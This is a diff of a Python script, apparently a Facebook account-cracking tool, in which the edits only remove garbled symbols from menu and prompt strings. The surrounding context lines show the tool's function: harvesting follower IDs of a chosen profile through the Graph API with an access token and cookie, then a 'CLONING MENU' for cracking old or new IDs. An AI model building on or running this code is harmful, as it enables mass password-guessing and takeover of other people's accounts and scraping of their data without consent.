@@ -357,7 +357,7 @@ def dump_massal():
 			exit()
 	try:
 		print('')
-		print(f'{k}=>TOTAL IDâ˜…{b}'+str(len(id)))
+		print(f'{k}=>TOTAL ID:{b}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{u}')
@@ -375,7 +375,7 @@ def dump_pengikut():
 	except IOError:
 		exit()
 	print('=>TYPE ME IF YOU WNT DUMP TOKEN ID FRIENDS ')
-	pil = input('âž¥âž£ENTER ID LNK : ')
+	pil = input('ENTER ID LNK : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
@@ -390,7 +390,7 @@ def dump_pengikut():
 		print('=>ERORR ')
 		exit()
 #------------------[ CRACK-GRUP ]-----------------#
-balmond = b+"["+h+"âœ“"+b+"]"
+balmond = b+"["+h+"“"+b+"]"
 
 def lah():
 	print("\r"+balmond+m+" \x1b[1;95mTotal ID Yang Terkumpul :\x1b[1;97m "+str(len(id))+"                     ")
@@ -544,9 +544,9 @@ def crack_file():
 		setting()
 #-------------[ Id -Crackiing]---------------#
 def setting():
-	cetak(nel('\t[bold cyan]         CLONING MENU â€¢ [/bold cyan]'))
+	cetak(nel('\t[bold cyan]         CLONING MENU  [/bold cyan]'))
 	print('') 
-	cetak(nel('[bold yellow]â¤ï¸âž£1. CLONE JUST OLD IDZ \nâ¤ï¸âž£2. CLONE JUST NEW IDZ(RECOMEND)\nâ¤ï¸âž£3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold yellow]'))
+	cetak(nel('[bold yellow]1. CLONE JUST OLD IDZ \n2. CLONE JUST NEW IDZ(RECOMEND)\n3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold yellow]'))
 	print('')
 	hu = input('=>CHOOSE : ')
 	if hu in ['1','01']:
